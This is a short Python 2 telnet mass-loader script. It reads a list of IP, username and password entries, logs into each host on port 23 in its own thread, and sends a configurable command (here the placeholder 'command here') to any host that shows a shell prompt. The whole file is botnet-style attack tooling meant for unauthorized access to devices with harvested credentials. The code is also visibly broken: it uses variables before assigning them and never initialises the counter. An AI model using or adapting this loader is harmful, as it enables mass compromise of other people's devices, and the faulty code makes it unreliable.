#!/usr/bin/python
# By; LiGhT
# For; Cat
# List format: ip:username:password
import threading, sys, time, random, socket, re, os

if len(sys.argv) < 2:
    print "Usage: python "+sys.argv[0]+" <list>"
    sys.exit()

balls = open(sys.argv[1], "r").readlines()
cmd = "command here"
def readUntil(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

class rekt(threading.Thread):
        def __init__ (self, ip):
            threading.Thread.__init__(self)
        def run(self):
            line = line.split(":")
            ip = line[0].rstrip("\n")
            username = line[1].rstrip("\n")
            password = line[2].rstrip("\n")
            try:
                tn = socket.socket()
                tn.settimeout(5)
                tn.connect((ip,23))
            except Exception:
                pass
            try:
                dicks = ''
                dicks += readUntil(tn, ":")
                if "ogin" in dicks or "sername" in dicks:
                    tn.send(username + "\n")
            except Exception:
                pass
            try:
                dicks = ''
                dicks += readUntil(tn, ":")
                if "assword" in dicks:
                    tn.send(password + "\n")
                    time.sleep(3)
            except Exception:
                pass
            try:
                mp = ''
                mp += tn.recv(1024)
                if "#" in mp or "$" in mp or "~" in mp or ">" in mp:
                    tn.send(cmd + "\n")
                    print "[%s] command sent!"%(ip)
                    time.sleep(8)
            except Exception:
                print "[%s] TIMEOUT"%(count)
                pass
for line in balls:
    try:
        count += 1
        k = rekt(line)
        k.start()
        time.sleep(0.01)
    except:
        pass